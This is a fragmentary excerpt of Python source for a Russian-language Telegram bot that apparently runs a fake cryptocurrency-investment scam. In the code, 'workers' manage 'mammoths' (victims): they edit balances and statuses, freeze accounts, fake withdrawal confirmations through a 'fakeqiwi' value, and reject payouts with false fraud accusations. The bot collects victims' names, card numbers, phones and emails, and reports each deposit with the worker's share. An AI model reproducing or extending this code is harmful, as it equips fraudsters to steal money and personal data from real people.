...
from config import fraza_load,token,admins,poderjka,adminvxod,worker,minimalka,maximalka,vyplaty,fakeqiwi,\
...
from otvet import userbtn1,userbtn2,userbtn3,userbtn4,userbtn5,userbtn6,activ1,activ2,activ3,activ4,activ5,activ6,select,\
	otmena,verx,vniz,rovno,balanceqiwi,balancepromo,qiwiorpromo,oplata,proverit,rem,workerpanel,workerinfo, projekt1, inline_oplata, inlines_oplatas, inline_ofdgdfg, userbtn11, userbtn52, userbtn53, refff, inline_kurs, TP_mamontsVR, TP_mamonts
from otvet import pravila,soglashenie,user,start,start2,akcii,popolnenie,cancel,adminpanel,igrabtn,textotzyv,balancecard,inline_tex,inline_tex2
from curses import convert_currency,formatted_currency
from config import TP_ID
import config
import curses
import otvet
...
def main_message(message):
	...
	if message.text == userbtn1 and not(freeze_users):
		bot.send_photo(message.chat.id,f'{config.photos}', caption= '*Выберите криптовалюту для инвестирования:*',parse_mode='Markdown',reply_markup=akcii())
		...
		try:
			...
			p = bot.send_photo(message.chat.id, token_photo, caption=f"👨🏽‍💻 <strong>Личный кабинет</strong> {message.chat.first_name}\n\n"+
												...
												f"<strong>Ваша реферальная ссылка:</strong> http://t.me/{bot_username}?start={message.chat.id}\n",reply_markup= inline_oplata(), parse_mode="HTML")
			BD.close()
		...
		bot.send_photo(message.chat.id,f'{config.photos2}', caption= "*Полезная и важная информация*",reply_markup= inlines_oplatas(), parse_mode="Markdown")
		...
		if message.text[1:].isdigit():
			...
			if pp != None:
				if len(BD.get_user_curses(message.text[1:])) > 0:
					...
					USER1 =  "USER: @" + str(statwusername1[3])
					status1 =  "Статус: " +  str(statwusername1[5])
					balanse1 =  "Balance: " + str(statwusername1[4])
					requests124 = "Реквизиты: " + str(statwusername1[8])
					verifications1 =  "Верификация: " + ["Нет","Да"][int(statwusername1[6])]
					zamorochens =   "Заморожен: " +  ["Нет","Да"][int(statwusername1[7])]
					email = f"Email: {email}"
					card = f"Карта: {card}"
					num = f"Номер: {num}"
					fio = f"Ф.И.О: {fio}"
...
# clck
					...
					no6 = types.InlineKeyboardButton(text="Изменить ТП", callback_data="update_tp")
...
Страна: {info[18]}"""
			...
			BD.update_balance(Is,bn+summa_pay)
			BD.close()
			bot.send_message(Is, "❌ Ваша заявка на вывод отклонена!\n\nВы подозреваетесь в мошеннечестве!\nСредства были возвращены и заблоктрованы", reply_markup=keyboards)
			...
			requests124 = "Реквизиты: " + str(statwusername1[8])
			verifications1 =  "Верификация: " + ["Нет","Да"][int(statwusername1[6])]
			zamorochens =   "Заморожен: " +  ["Да","Нет"][int(statwusername1[7])]
			...
			USER1 =  "USER: @" + str(statwusername1[3])
			status1 =  "Статус: " +  ["1","0"][int(bool(statwusername1[5]))]
			balanse1 =  "Balance: " + str(statwusername1[4])
			requests124 = "Реквизиты: " + str(statwusername1[8])
			verifications1 =  "Верификация: " + ["Нет","Да"][int(statwusername1[6])]
			zamorochens =   "Заморожен: " +  ["Нет","Да"][int(statwusername1[7])]
			...
			balanse1 =  "Balance: " + str(statwusername1[4])
			requests124 = "Реквизиты: " + str(statwusername1[8])
			verifications1 =  "Верификация: " + ["Да","Нет"][int(statwusername1[6])]
			zamorochens =   "Заморожен: " +  ["Нет","Да"][int(statwusername1[7])]
			...
			if paystatus == "PAID":
				...
				try:
					...
					bot.send_message(vyplaty,f"🦋 *Успешное* пополнение #TREID\n\n💁🏻‍♀️ Воркер: @{workerusername}\n\n⚡️ Сумма пополнения: *{skolko}* ₽\n💸 Доля воркера: ~ *{round((dolya*skolko)/100)}* ₽",parse_mode='Markdown')
			...
			if countwstat == 0:
				...
				spisokmamont = f"🥰 Твои Мамонты - {counts_mamonts}|{len(lst_ignor)}\n(ID)-@username-баланс-статус\n\n" 
			...
			if countwstat == 0:
				...
				wrk14 =  types.InlineKeyboardButton(text="👑 Изменить статус", callback_data="statusreplace")
				wrk13 = types.InlineKeyboardButton(text="💲 Изменит баланс", callback_data="admbalance")
				wrk1199 = types.InlineKeyboardButton(text = "🥶 Заморозить", callback_data = 'freeze_user')
				wrk11 = types.InlineKeyboardButton(text="✖️ Удалить мамонта", callback_data="mamont_delete")
				wrk2021 = types.InlineKeyboardButton(text="Назад", callback_data="mamont_nazad")
		...
		elif call.data == "projekt" and not(freeze_users):
			info_mini = types.InlineKeyboardMarkup()
			wrk2021 = types.InlineKeyboardButton(text="✅ Понял", callback_data="mamont_nazad")
			info_mini.add(wrk2021)
			bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text = projekt1,reply_markup=info_mini)
			...
			bot.delete_message(call.from_user.id, call.message.message_id)
			BD = SQLt()
			bot.send_message(call.message.chat.id,f"Введите сумму для вывода.\nНа балансе: {formatted_currency(BD,BD.getbalance(call.message.chat.id),call.message.chat.id,BD.get_user_curses(call.message.chat.id))}",reply_markup=cancel())
			BD.close()
		...
		# 	bot.register_next_step_handler(call.message, popolni)
			...
			bot.delete_message(call.from_user.id, call.message.message_id)
			bot.send_message(call.message.chat.id,"Напишите свой промокод",reply_markup=cancel())
			bot.register_next_step_handler(call.message, promo)
		elif call.data == "refff" and not(freeze_users):
			bot.delete_message(call.from_user.id, call.message.message_id)
			bot.send_message(call.message.chat.id,"_Если человек приглашенный по вашей реферальной ссылки совершит депозит, вы получите 5 % от суммы его вывода_", parse_mode="Markdown")
		...
		# 	bot.register_next_step_handler(call.message, popolnicard)   
			...
			msg = bot.send_message(call.from_user.id, text="📩 Введите ФИО:\n\nПример: Иван Иванович Пупкин", reply_markup=cancel())
		...
		if message.text.isdigit():
			...
			if int(wow) > 0:
				...
				if balancevyvod<int(wow):
					...
					bot.send_message(message.chat.id, "Выберите систему вывода из предложенных!",reply_markup=koshelki)
			...
			if len(message.text)>5 and len(message.text)<20:
				...
				if pmst == 1:
					...
					if int(message.text) == fakeqiwi:
						...
						bot.send_message(message.chat.id, "Ваша заявка на вывод была успешно создана! \nОжидайте вывода средств.",reply_markup=user())
